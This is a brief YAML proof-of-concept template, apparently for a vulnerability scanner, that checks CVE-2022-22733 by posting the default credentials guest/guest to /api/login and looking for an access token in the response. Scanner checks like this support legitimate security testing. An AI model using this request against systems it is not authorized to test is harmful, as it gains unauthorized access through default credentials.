name: poc-yaml-CVE-2022-22733
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /api/login
      headers:
        Content-Type: application/json;charset=UTF-8
      body: '{"username":"guest","password":"guest"}'
    expression: response.status == 200 && response.body.bcontains(bytes("accessToken"))

expression: r0()

detail:
  author: Henry4E36
  links:
    - https://github.com/Henry4E36